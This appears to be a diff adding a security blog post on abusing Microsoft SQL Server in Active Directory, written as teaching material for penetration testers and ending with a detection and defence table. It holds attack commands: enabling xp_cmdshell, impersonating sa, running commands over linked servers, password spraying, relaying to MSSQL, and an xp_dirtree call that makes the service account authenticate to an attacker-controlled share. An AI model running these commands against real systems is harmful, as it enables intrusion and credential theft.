@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MSSQL / SQL Server Abuse — Satej Chaudhari</title>
+  <meta name="description" content="Microsoft SQL Server as an Active Directory attack surface — Windows authentication, command execution via xp_cmdshell and CLR, EXECUTE AS impersonation, trusted-link crawling, and coercion of the service account for relay.">
+
+  <link rel="icon" type="image/svg+xml" href="../assets/img/favicon.svg">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <script>
+  (function(){
+    try{var t=localStorage.getItem('theme');if(t==='light'||t==='dark')document.documentElement.setAttribute('data-theme',t);}catch(e){}
+    document.addEventListener('DOMContentLoaded',function(){
+      var b=document.querySelector('.theme-toggle');
+      if(b)b.addEventListener('click',function(){
+        var d=document.documentElement,c=d.getAttribute('data-theme')||'dark',n=c==='dark'?'light':'dark';
+        d.setAttribute('data-theme',n);try{localStorage.setItem('theme',n);}catch(e){}
+      });
+      var nt=document.querySelector('.nav-toggle'),nv=document.querySelector('.site-nav');
+      if(nt&&nv&&!nt.dataset.bound){nt.dataset.bound='1';nt.addEventListener('click',function(){var o=nv.classList.toggle('open');nt.setAttribute('aria-expanded',o?'true':'false');});}
+    });
+  })();
+  </script>
+</head>
+<body>
+
+  <header class="site-header">
+    <div class="wrap-wide">
+      <a class="brand" href="../index.html">
+        <span class="brand-mark">SC</span>
+        <span class="brand-name">Satej Chaudhari</span>
+      </a>
+      <nav class="site-nav">
+        <a href="../index.html">Home</a>
+        <a href="../writeups.html">Writeups</a>
+        <a href="../blog.html">Blog</a>
+        <a href="../theory.html">Theory</a>
+        <a href="../toolkit.html">Toolkit</a>
+        <a href="../vulns.html">Vulns &amp; Misconfigs</a>
+        <a href="https://github.com/satejchaudhari" target="_blank" rel="noopener" class="nav-external">GitHub</a>
+      </nav>
+      <button class="theme-toggle" aria-label="Toggle light and dark theme" title="Toggle theme">
+        <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>
+        <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line></svg>
+      </button>
+      <button class="nav-toggle" aria-label="Toggle menu" aria-expanded="false">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
+      </button>
+    </div>
+  </header>
+
+  <main class="wrap post">
+    <a class="post-back" href="../theory.html">&larr; back to theory</a>
+
+    <article>
+      <header class="post-header">
+        <span class="tag">AD</span>
+        <h1 class="post-title">MSSQL / SQL Server Abuse</h1>
+        <p class="post-meta">
+          <time datetime="2026-09-24">2026-09-24</time>
+          <span>&middot; 15 min read</span>
+        </p>
+      </header>
+
+      <div class="post-body">
+
+        <p>
+          Microsoft SQL Server is everywhere in an enterprise, it authenticates users with their
+          domain identity, and its service runs as a domain account that is frequently
+          over-privileged. That combination makes MSSQL less of a "database" and more of a
+          <em>distributed execution and credential surface</em> woven through Active Directory. You
+          rarely need a SQL-injection bug to abuse it — valid domain credentials and a permissive
+          configuration are usually enough.
+        </p>
+
+        <blockquote>
+          The three levers to keep in mind: SQL Server can <strong>run OS commands</strong> as its
+          service account, it can <strong>impersonate</strong> other logins inside the engine, and
+          instances <strong>trust each other</strong> through linked servers. Chain those and a single
+          low-privileged connection can walk across servers and out onto the host.
+        </blockquote>
+
+        <h2>Finding instances and getting in</h2>
+        <p>
+          SQL Server registers a Service Principal Name (<code>MSSQLSvc/host:port</code>), so instances
+          are discoverable straight from the directory — which also makes the service accounts
+          <a href="2026-08-18-kerberoasting.html">Kerberoastable</a>. From there you authenticate with
+          Windows (integrated) auth using your domain user, hash or ticket:
+        </p>
+        <pre><code>Get-SQLInstanceDomain | Get-SQLConnectionTest        # PowerUpSQL: find instances you can reach
+nxc mssql &lt;range&gt; -u &lt;user&gt; -p '&lt;pass&gt;'                # spray/where-can-I-log-in
+mssqlclient.py -windows-auth &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;'@&lt;ip&gt;</code></pre>
+
+        <h2>The privilege model that makes it dangerous</h2>
+        <p>
+          SQL Server has its own identity system layered on top of Windows. Understanding it tells you
+          what to look for:
+        </p>
+        <table>
+          <thead><tr><th>Concept</th><th>Meaning</th></tr></thead>
+          <tbody>
+            <tr><td>Login</td><td>Server-level identity (a Windows account/group, or a SQL login)</td></tr>
+            <tr><td>User</td><td>A login mapped into a specific database</td></tr>
+            <tr><td><code>sysadmin</code> (sa)</td><td>God on the instance — can do anything, including OS command execution</td></tr>
+            <tr><td><code>public</code></td><td>The role every login has; the baseline you start from</td></tr>
+            <tr><td>Service account context</td><td>Whatever OS commands you run execute as <em>this</em> account, not yours</td></tr>
+          </tbody>
+        </table>
+        <p>
+          The prize is <code>sysadmin</code>, but you rarely start there. The interesting question is
+          how to <em>reach</em> it from <code>public</code> — and the answer is usually impersonation
+          or a linked server.
+        </p>
+
+        <h2>Command execution — xp_cmdshell and friends</h2>
+        <p>
+          The classic primitive is <code>xp_cmdshell</code>, an extended stored procedure that runs a
+          shell command as the SQL service account. It is disabled by default, but a
+          <code>sysadmin</code> can turn it on in two statements:
+        </p>
+        <pre><code>EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';</code></pre>
+        <p>It is not the only route to OS or code execution:</p>
+        <table>
+          <thead><tr><th>Vector</th><th>Notes</th></tr></thead>
+          <tbody>
+            <tr><td>OLE Automation (<code>sp_OACreate</code>)</td><td>Instantiate COM objects — run commands, write files, without xp_cmdshell</td></tr>
+            <tr><td>CLR assemblies</td><td>Load a .NET assembly into the engine and call it — powerful and stealthier</td></tr>
+            <tr><td>SQL Agent jobs</td><td>Schedule a job step (CmdExec/PowerShell) that runs under the agent account</td></tr>
+            <tr><td><code>xp_dirtree</code> / <code>xp_fileexist</code></td><td>Not execution, but they trigger outbound SMB — see coercion below</td></tr>
+          </tbody>
+        </table>
+        <p>
+          Whatever the vector, the command runs as the <em>service account</em>. If that account holds
+          <code>SeImpersonatePrivilege</code> (service accounts usually do), you can escalate to
+          <code>SYSTEM</code> with a <a href="2026-08-18-windows-tokens-uac.html">potato</a> technique;
+          if it is a privileged domain account, you may already have what you need.
+        </p>
+
+        <h2>Impersonation — EXECUTE AS</h2>
+        <p>
+          SQL Server lets one login run statements <em>as</em> another when granted the
+          <code>IMPERSONATE</code> permission — a feature apps use for delegation, and a privilege
+          escalation when it points at a higher-privileged login:
+        </p>
+        <pre><code>-- who can I impersonate?
+SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
+EXECUTE AS LOGIN = 'sa';   -- become sysadmin if you were granted impersonate on sa
+SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');</code></pre>
+        <p>
+          A related classic is the <strong>trustworthy database</strong> misconfiguration: if a
+          database is marked <code>TRUSTWORTHY</code> and you are <code>db_owner</code> there, you can
+          create a stored procedure that runs as a sysadmin and escalate to full server control.
+        </p>
+
+        <h2>Linked servers — trust that crawls</h2>
+        <p>
+          Administrators connect instances with <strong>linked servers</strong> so queries can span
+          databases. Those links carry a security context — sometimes a fixed, high-privileged login —
+          and links are frequently transitive. You can crawl the graph and end up as
+          <code>sysadmin</code> on a server you were never granted access to:
+        </p>
+        <pre><code>Get-SQLServerLinkCrawl -Instance &lt;sql&gt; -Query 'SELECT SYSTEM_USER'   # PowerUpSQL: walk every link
+-- manual, in mssqlclient.py:
+EXEC ('SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT [LINKED\INSTANCE];
+-- execute out through a link where you are sysadmin:
+EXEC ('sp_configure ''xp_cmdshell'',1; RECONFIGURE; EXEC xp_cmdshell ''whoami''') AT [LINKED\INSTANCE];</code></pre>
+        <p>
+          Even a single self-referential or misconfigured link can be the whole path, so link crawling
+          is one of the highest-value things to do the moment you can authenticate to any instance.
+        </p>
+
+        <h2>Coercion — make the service account authenticate to you</h2>
+        <p>
+          You do not need command execution to weaponise SQL Server against the domain. Procedures
+          like <code>xp_dirtree</code> take a UNC path and cause the <em>service account</em> to
+          authenticate to it over SMB. Point it at your listener and you capture or relay that
+          NetNTLM — straight into the <a href="2026-08-18-coercion-ntlm-relay.html">coercion &amp;
+          relay</a> workflow:
+        </p>
+        <pre><code>EXEC xp_dirtree '\\&lt;attacker_ip&gt;\share', 1, 1;     -- service account auths to you
+-- capture with Responder, or relay with ntlmrelayx to an unsigned host / LDAP</code></pre>
+        <p>
+          This is powerful because it works from a low-privileged login: you cannot run
+          <code>xp_cmdshell</code>, but you <em>can</em> make a privileged service account leak its
+          authentication.
+        </p>
+
+        <h2>Relaying <em>to</em> MSSQL</h2>
+        <p>
+          The reverse also holds: if you have coerced or captured a privileged account's
+          authentication elsewhere, you can relay it <em>into</em> SQL Server and run commands as that
+          identity:
+        </p>
+        <pre><code>ntlmrelayx.py -t mssql://&lt;sql_ip&gt; -q "EXEC xp_cmdshell 'whoami'"</code></pre>
+
+        <h2>From SQL to the domain</h2>
+        <p>
+          Put the pieces together and MSSQL becomes a bridge into the wider
+          <a href="../ad-map.html">attack path</a>: Kerberoast the service SPN offline; authenticate;
+          crawl links to become sysadmin somewhere; run <code>xp_cmdshell</code>; if the token holds
+          <code>SeImpersonate</code>, potato to SYSTEM; dump
+          <a href="2026-08-18-windows-credential-storage.html">LSASS</a> for the next set of
+          credentials — and repeat.
+        </p>
+
+        <h2>Detection &amp; defence</h2>
+        <table>
+          <thead><tr><th>Control</th><th>Effect</th></tr></thead>
+          <tbody>
+            <tr><td>Keep <code>xp_cmdshell</code> disabled and alert on <code>sp_configure</code> toggling it</td><td>Removes/flags the loudest execution primitive</td></tr>
+            <tr><td>Run the service as a low-privileged <strong>gMSA</strong>; strip local admin and unnecessary domain rights</td><td>Command execution and coercion become far less useful</td></tr>
+            <tr><td>Remove <code>sysadmin</code> from application logins; audit <code>IMPERSONATE</code> grants and <code>TRUSTWORTHY</code> databases</td><td>Closes the EXECUTE-AS escalation paths</td></tr>
+            <tr><td>Review linked servers and the security context they use; avoid fixed high-priv contexts</td><td>Stops link crawling from reaching sysadmin</td></tr>
+            <tr><td>Enforce SMB signing / EPA and disable NTLM where possible</td><td>Neutralises <code>xp_dirtree</code> coercion and relay to SQL</td></tr>
+            <tr><td>Use a strong, unique password on the SQL SPN account</td><td>Defeats offline Kerberoast cracking</td></tr>
+          </tbody>
+        </table>
+
+        <h2>The takeaway</h2>
+        <p>
+          Treat every SQL Server as a domain-privileged execution host, not just a data store. The
+          escalation ladder is almost always the same — <em>authenticate → impersonate or crawl a link
+          → become sysadmin → execute as the service account → potato to SYSTEM → harvest credentials</em>
+          — and none of it requires a memory-corruption exploit, only permissive defaults. Tools such
+          as PowerUpSQL and Impacket's <code>mssqlclient.py</code> are in the
+          <a href="../toolkit.html">Toolkit</a>, and the practical commands are under <em>MSSQL lateral
+          movement</em> and <em>SQL Server links</em> in
+          <a href="../vulns.html">Vulns &amp; Misconfigs</a>.
+        </p>
+        
+      </div>
+    </article>
+  </main>
+
+  <footer class="site-footer">
+    <div class="wrap-wide">
+      <p>&copy; 2026 Satej Chaudhari</p>
+      <div class="footer-links">
+        <a href="../writeups.html">Writeups</a>
+        <a href="../blog.html">Blog</a>
+        <a href="../theory.html">Theory</a>
+        <a href="../toolkit.html">Toolkit</a>
+        <a href="../vulns.html">Vulns &amp; Misconfigs</a>
+        <a href="../disclaimer.html">Disclaimer</a>
+      </div>
+    </div>
+  </footer>
+
+  <script src="../assets/js/main.js"></script>
+</body>
+</html>
